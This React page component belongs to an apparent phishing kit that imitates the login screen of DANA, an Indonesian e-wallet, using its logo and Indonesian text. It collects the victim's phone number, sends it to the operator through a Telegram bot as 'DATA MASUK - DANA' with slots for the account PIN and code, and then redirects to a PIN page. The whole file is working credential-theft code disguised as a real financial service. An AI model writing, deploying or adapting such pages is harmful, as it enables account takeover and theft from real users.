import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";

export default function PhoneInput() {
  const [phone, setPhone] = useState("");
  const navigate = useNavigate();
  const params = new URLSearchParams(window.location.search);
  const type = params.get("type") || "pemulihan_akun";

  const handleSubmit = async () => {
    if (!phone || phone.length < 8) return;
    const submission = await base44.entities.Submission.create({
      phone: phone,
      report_type: type,
      status: "phone",
    });
    const line = "━".repeat(21);
    const msg = `${line}\nDATA MASUK - DANA\n${line}\nNama Akun  : ${phone}\nPin Akun   : menunggu...\nKode Akun  : menunggu...\n${line}`;
    const configs = await base44.entities.TelegramConfig.list();
    if (configs.length > 0) {
      const { bot_token, chat_id } = configs[0];
      const res = await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: msg }),
      });
      const data = await res.json();
      if (data.ok) {
        await base44.entities.Submission.update(submission.id, { telegram_message_id: data.result.message_id });
      }
    }
    navigate(`/pin?id=${submission.id}`);
  };

  return (
    <div className="min-h-screen bg-[#108ee9] max-w-md mx-auto flex flex-col">
      <div className="flex-1 flex flex-col items-center pt-12 px-6">
        <div className="flex items-center gap-2 mb-6">
          <img src="https://media.base44.com/images/public/6a0dd56c28155ad163bda1ee/addb2c666_dana-logofe46647.png" alt="DANA" className="h-9" />
        </div>

        <p className="text-white text-center text-lg mb-8">
          Masukkan <b>nomor HP</b> kamu untuk lanjut
        </p>

        <div className="w-full flex gap-3 items-end mb-4">
          <div>
            <p className="text-white/80 text-sm mb-1">Negara</p>
            <div className="bg-white/20 rounded-lg px-3 py-3 flex items-center gap-2 text-white font-medium">
              <span className="text-lg">🇮🇩</span> +62
            </div>
          </div>
          <div className="flex-1">
            <p className="text-white/80 text-sm mb-1">Nomor</p>
            <input
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
              placeholder="811-1234-5678"
              className="w-full bg-white/20 rounded-lg px-4 py-3 text-white placeholder-white/50 outline-none text-lg"
            />
          </div>
        </div>

        <p className="text-white/80 text-sm text-center mt-2">
          Dengan melanjutkan, kamu setuju dengan{" "}
          <b className="text-white">Syarat & Ketentuan</b> serta{" "}
          <b className="text-white">Pemberitahuan Privasi</b> kami
        </p>
      </div>

      <div className="px-6 pb-8">
        <button
          onClick={handleSubmit}
          disabled={!phone || phone.length < 8}
          className="w-full py-4 rounded-xl text-lg font-bold transition-all disabled:bg-gray-300 disabled:text-gray-500 bg-white text-[#108ee9]"
        >
          LANJUT
        </button>
      </div>
    </div>
  );
}
